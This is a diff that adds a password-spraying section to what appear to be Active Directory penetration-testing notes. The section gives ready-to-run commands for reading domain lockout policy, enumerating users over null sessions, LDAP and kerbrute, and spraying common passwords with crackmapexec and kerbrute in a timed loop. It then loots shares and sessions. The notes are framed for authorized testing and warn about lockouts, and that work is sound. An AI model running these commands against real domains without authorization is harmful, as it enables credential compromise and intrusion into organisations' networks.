@@ -86,6 +86,52 @@ Then reuse creds: `crackmapexec smb <HOST> -u <user> -p <pass>` (or `-H <hash>` 
 
 > This is usually the first thing I run on an internal test — passive `-A` first to confirm the protocols are live and in scope, then poison. One cracked hash from here is often the whole foothold.
 
+## Password Spraying (one password, many users)
+The safe way to use creds you don't have: try *one* common password across *all* users. **Rule: get the password policy FIRST** so you don't trip account lockouts.
+
+### Step 1 — get the password policy
+```bash
+# credentialed
+crackmapexec smb <DC> -u <u> -p <p> --pass-pol
+# no creds (SMB null session / LDAP anon — older/misconfigured DCs)
+rpcclient -U "" -N <DC>            # then: querydominfo , getdompwinfo
+enum4linux-ng -P <DC> -oA out
+ldapsearch -h <DC> -x -b "DC=<d>,DC=LOCAL" -s sub "*" | grep -m1 -B10 pwdHistoryLength
+# on Windows:  net accounts   |   Import-Module PowerView; Get-DomainPolicy
+```
+What matters: **lockout threshold**, lockout **duration**, reset window, min length/complexity. Threshold 0 = no lockout (spray freely); else stay well under it.
+
+### Step 2 — build the target user list
+```bash
+# no creds
+enum4linux -U <DC> | grep "user:"                       # or rpcclient: enumdomusers
+./windapsearch.py --dc-ip <DC> -u "" -U
+kerbrute userenum -d <domain> --dc <DC> users.txt       # Kerberos pre-auth, fast/stealthier
+# credentialed
+crackmapexec smb <DC> -u <u> -p <p> --users             # shows badpwdcount!
+ldapsearch -h <DC> -x -b "DC=<d>,DC=LOCAL" "(objectclass=user)" | grep sAMAccountName | cut -d" " -f2
+# OSINT: company emails, linkedin2username → match the naming schema
+```
+
+### Step 3 — spray (slow, logged)
+```bash
+kerbrute passwordspray --dc <DC> -d <domain> -U users.txt -p 'Welcome1'
+crackmapexec smb <DC> -u users.txt -p 'Welcome1' --no-bruteforce   # 1 pw x all users
+# loop multiple passwords with a delay to respect lockout policy
+for pw in Welcome1 Passw0rd Winter2024; do
+  cme smb <DC> -u users.txt -p "$pw" --no-bruteforce
+  sleep 1800     # wait out the lockout window between rounds
+done
+```
+Then validate + loot: `cme smb <DC> -u <user> -p <pw> --shares --sessions`.
+
+**Operational notes (worth knowing):**
+- kerbrute userenum generates **Event ID 4768** (TGT requested) — not silent.
+- `badpwdcount` is tracked **per DC**; the **PDC emulator** holds the most accurate count. Spraying across DCs can multiply attempts, so account for that.
+- Keep a **log** of every spray (user set, DC, time, password) — avoids duplicate lockout risk and documents the test.
+
+> Spraying is how a user list with no passwords becomes a foothold. The discipline is all in step 1 — lock out a client's users and you've caused an incident, not found a finding.
+
 ## AD attack flow (reference)
 Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).
 
